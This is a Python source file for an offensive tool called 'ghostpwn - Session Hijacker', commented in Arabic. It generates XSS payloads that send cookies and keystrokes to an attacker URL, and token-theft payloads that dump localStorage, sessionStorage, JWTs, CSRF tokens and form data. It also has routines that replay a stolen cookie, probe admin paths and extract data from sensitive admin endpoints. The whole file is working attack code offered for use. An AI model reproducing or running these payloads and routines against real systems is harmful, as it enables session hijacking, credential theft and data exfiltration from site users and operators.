#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Session Hijacker
الاستيلاء على الجلسات عبر XSS / token theft / cookie stealing
"""
import sys
import os
import re
import time
import json
import urllib.parse
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.http_client import HttpClient
from modules.arabic_display import SmartLogger, Colors, fix_display


class SessionHijacker:
    """الاستيلاء على الجلسات"""

    def __init__(self, http_client: HttpClient, audit_logger=None):
        self.client = http_client
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.stolen_sessions = []

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[SESSION] {msg}", level)

    # ============================ XSS Cookie Stealing Payloads ============================
    def generate_xss_payloads(self, attacker_url: str) -> List[Dict]:
        """توليد payloads لسرقة cookies عبر XSS"""
        payloads = [
            {
                "name": "img_onerror",
                "payload": f"<img src=x onerror='document.location=\"{attacker_url}/?c=\"+document.cookie'>",
                "description": "صورة مع onerror لسرقة cookies",
            },
            {
                "name": "script_fetch",
                "payload": f"<script>fetch('{attacker_url}/?c='+document.cookie)</script>",
                "description": "استخدام fetch API",
            },
            {
                "name": "script_img",
                "payload": f"<script>new Image().src='{attacker_url}/?c='+document.cookie</script>",
                "description": "تحميل صورة لإرسال cookies",
            },
            {
                "name": "script_ajax",
                "payload": f"<script>var x=new XMLHttpRequest();x.open('GET','{attacker_url}/?c='+document.cookie);x.send();</script>",
                "description": "XMLHttpRequest لسرقة cookies",
            },
            {
                "name": "svg_onload",
                "payload": f"<svg onload='fetch(\"{attacker_url}/?c=\"+document.cookie)'>",
                "description": "SVG مع onload",
            },
            {
                "name": "body_onload",
                "payload": f"<body onload='document.location=\"{attacker_url}/?c=\"+document.cookie'>",
                "description": "body onload",
            },
            {
                "name": "iframe",
                "payload": f"<iframe src='javascript:document.location=\"{attacker_url}/?c=\"+document.cookie' style='display:none'></iframe>",
                "description": "iframe مخفي",
            },
            {
                "name": "keylogger",
                "payload": f"<script>document.onkeypress=function(e){{fetch('{attacker_url}/?k='+e.key)}}</script>",
                "description": "keylogger لإرسال كل ضغطات المفاتيح",
            },
        ]
        return payloads

    # ============================ Token Theft ============================
    def generate_token_theft_payloads(self, attacker_url: str) -> List[Dict]:
        """payloads لسرقة tokens (JWT, CSRF, etc.)"""
        payloads = [
            {
                "name": "localStorage_dump",
                "payload": f"<script>fetch('{attacker_url}/?d='+JSON.stringify(localStorage))</script>",
                "description": "استخراج كل localStorage",
            },
            {
                "name": "sessionStorage_dump",
                "payload": f"<script>fetch('{attacker_url}/?s='+JSON.stringify(sessionStorage))</script>",
                "description": "استخراج كل sessionStorage",
            },
            {
                "name": "jwt_steal",
                "payload": f"<script>fetch('{attacker_url}/?t='+document.cookie.match(/jwt=([^;]+)/)?.[1])</script>",
                "description": "سرقة JWT من cookies",
            },
            {
                "name": "csrf_token_steal",
                "payload": f"<script>fetch('{attacker_url}/?csrf='+document.querySelector('[name=csrf_token]')?.value)</script>",
                "description": "سرقة CSRF token",
            },
            {
                "name": "form_dump",
                "payload": f"<script>var forms=document.forms;var data={{}};for(var i=0;i<forms.length;i++){{for(var j=0;j<forms[i].elements.length;j++){{data[forms[i].elements[j].name]=forms[i].elements[j].value}}}}fetch('{attacker_url}/?f='+JSON.stringify(data))</script>",
                "description": "استخراج كل بيانات الـ forms",
            },
        ]
        return payloads

    # ============================ Use Stolen Session ============================
    def use_stolen_cookie(self, target_url: str, cookie: str) -> Dict:
        """استخدام cookie مسروق للوصول للهدف"""
        self._log(f"محاولة استخدام cookie مسروق...", "info")

        # استخدام الـ cookie
        resp = self.client.get(target_url, headers={"Cookie": cookie})

        result = {
            "target": target_url,
            "cookie": cookie[:50] + "...",
            "status": resp["status"],
            "authenticated": False,
            "user_info": None,
        }

        # فحص لو الـ response يدل على مصادقة ناجحة
        body_lower = resp["body"].lower()

        auth_indicators = [
            "welcome", "dashboard", "my account", "profile", "logout",
            "log out", "sign out", "settings", "admin panel", "حسابي",
        ]

        for indicator in auth_indicators:
            if indicator in body_lower:
                result["authenticated"] = True
                result["user_info"] = f"Found: {indicator}"
                self._log(f"مصادقة ناجحة! ({indicator})", "success")
                break

        if not result["authenticated"]:
            # فحص لو فيه redirect لـ dashboard
            if resp["status"] in (301, 302):
                location = resp["headers"].get("Location", "")
                if any(s in location.lower() for s in ["dashboard", "home", "admin", "profile"]):
                    result["authenticated"] = True
                    result["user_info"] = f"Redirect to: {location}"
                    self._log(f"مصادقة ناجحة! (redirect)", "success")

        # فحص form login (لو لسه في صفحة login = فشل)
        login_indicators = ["login", "sign in", "password", "username", "تسجيل الدخول"]
        if any(s in body_lower for s in login_indicators) and not result["authenticated"]:
            result["authenticated"] = False
            self._log("Cookie غير صالح - صفحة login ظاهرة", "warn")

        return result

    # ============================ Privilege Escalation via Session ============================
    def try_privilege_escalation(self, target_url: str, cookie: str) -> Dict:
        """محاولة رفع الصلاحيات عبر الجلسة"""
        self._log("محاولة رفع الصلاحيات...", "info")

        result = {
            "current_role": "user",
            "admin_access": False,
            "admin_urls": [],
        }

        # محاولة الوصول لـ admin pages
        admin_paths = [
            "/admin", "/admin/", "/administrator", "/admin/dashboard",
            "/admin panel", "/wp-admin", "/manager", "/console",
            "/admin/users", "/admin/settings", "/admin/config",
            "/api/admin", "/api/v1/admin", "/internal/admin",
        ]

        for path in admin_paths:
            admin_url = target_url.rstrip("/") + path
            resp = self.client.get(admin_url, headers={"Cookie": cookie})

            if resp["status"] == 200:
                # فحص لو فعلاً admin page
                body_lower = resp["body"].lower()
                admin_indicators = [
                    "admin panel", "administration", "manage users",
                    "system settings", "dashboard", "control panel",
                ]

                if any(s in body_lower for s in admin_indicators):
                    result["admin_access"] = True
                    result["current_role"] = "admin"
                    result["admin_urls"].append(admin_url)
                    self._log(f"وصول admin مكتشف: {admin_url}", "success")

            elif resp["status"] in (301, 302):
                result["admin_urls"].append(f"{admin_url} (redirect)")

        return result

    # ============================ Full Session Hijack ============================
    def hijack_session(self, target_url: str, stolen_cookie: str) -> Dict:
        """اختطاف جلسة كامل"""
        self._log("بدء اختطاف الجلسة...", "phase")

        result = {
            "target": target_url,
            "cookie_used": stolen_cookie[:50] + "...",
            "session_valid": False,
            "user_info": None,
            "admin_access": False,
            "actions_performed": [],
        }

        # 1) التحقق من صحة الجلسة
        auth_result = self.use_stolen_cookie(target_url, stolen_cookie)
        result["session_valid"] = auth_result["authenticated"]
        result["user_info"] = auth_result.get("user_info")

        if not result["session_valid"]:
            self._log("الجلسة غير صالحة", "error")
            return result

        # 2) محاولة رفع الصلاحيات
        privesc_result = self.try_privilege_escalation(target_url, stolen_cookie)
        result["admin_access"] = privesc_result["admin_access"]
        result["admin_urls"] = privesc_result["admin_urls"]

        # 3) استخراج بيانات حساسة (لو admin)
        if result["admin_access"]:
            self._log("وصول admin - استخراج بيانات حساسة...", "info")
            data_result = self._extract_admin_data(target_url, stolen_cookie)
            result["admin_data"] = data_result
            result["actions_performed"].append("extracted_admin_data")

        self.stolen_sessions.append(result)
        return result

    def _extract_admin_data(self, target_url: str, cookie: str) -> Dict:
        """استخراج بيانات admin"""
        data = {}

        # محاولة الوصول لـ endpoints حساسة
        sensitive_endpoints = [
            "/api/users", "/admin/users", "/api/v1/users",
            "/api/admin/users", "/admin/api/users",
            "/admin/settings", "/api/settings",
            "/admin/config", "/api/config",
            "/admin/database", "/api/database",
            "/admin/logs", "/api/logs",
            "/admin/backups", "/api/backups",
        ]

        for endpoint in sensitive_endpoints:
            url = target_url.rstrip("/") + endpoint
            resp = self.client.get(url, headers={"Cookie": cookie})

            if resp["status"] == 200 and len(resp["body"]) > 50:
                # فحص لو JSON
                try:
                    json_data = json.loads(resp["body"])
                    data[endpoint] = {
                        "type": "json",
                        "data": json_data if len(str(json_data)) < 5000 else "Large data",
                    }
                    self._log(f"بيانات مستخرجة من {endpoint}", "success")
                except json.JSONDecodeError:
                    # HTML أو نص
                    data[endpoint] = {
                        "type": "html",
                        "size": len(resp["body"]),
                        "preview": resp["body"][:200],
                    }

        return data

    def print_session_report(self, session: Dict):
        """عرض تقرير الجلسة"""
        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  🔓 تقرير اختطاف الجلسة{Colors.NC}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.NC}")

        print(f"\n  {Colors.BOLD}الهدف:{Colors.NC} {session['target']}")
        print(f"  {Colors.BOLD}Cookie:{Colors.NC} {session['cookie_used']}")

        status = "✓ صالحة" if session["session_valid"] else "✗ غير صالحة"
        status_color = Colors.GREEN if session["session_valid"] else Colors.RED
        print(f"  {Colors.BOLD}الحالة:{Colors.NC} {status_color}{fix_display(status)}{Colors.NC}")

        if session.get("user_info"):
            print(f"  {Colors.BOLD}المستخدم:{Colors.NC} {session['user_info']}")

        if session.get("admin_access"):
            print(f"\n  {Colors.RED + Colors.BOLD}👑 وصول ADMIN!{Colors.NC}")
            print(f"  {Colors.BOLD}Admin URLs:{Colors.NC}")
            for url in session.get("admin_urls", []):
                print(f"    {Colors.GREEN}✓{Colors.NC} {url}")

        if session.get("admin_data"):
            print(f"\n  {Colors.YELLOW}📊 بيانات admin مستخرجة:{Colors.NC}")
            for endpoint, info in session["admin_data"].items():
                print(f"    - {endpoint} ({info['type']}): {info.get('size', 'N/A')}")

        print(f"\n  {Colors.BOLD}الإجراءات:{Colors.NC}")
        for action in session.get("actions_performed", []):
            print(f"    {Colors.GREEN}✓{Colors.NC} {action}")

        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Session Hijacker")
    parser.add_argument("--generate", action="store_true", help="Generate XSS payloads")
    parser.add_argument("--attacker-url", default="http://attacker.com", help="Attacker URL")
    parser.add_argument("--use-cookie", help="Use stolen cookie")
    parser.add_argument("--target", help="Target URL")
    args = parser.parse_args()

    client = HttpClient(timeout=10)
    hijacker = SessionHijacker(client)

    if args.generate:
        print("\n XSS Cookie Stealing Payloads:")
        for p in hijacker.generate_xss_payloads(args.attacker_url):
            print(f"\n  [{p['name']}]")
            print(f"  {p['payload']}")

        print("\n Token Theft Payloads:")
        for p in hijacker.generate_token_theft_payloads(args.attacker_url):
            print(f"\n  [{p['name']}]")
            print(f"  {p['payload']}")

    elif args.use_cookie and args.target:
        result = hijacker.hijack_session(args.target, args.use_cookie)
        hijacker.print_session_report(result)
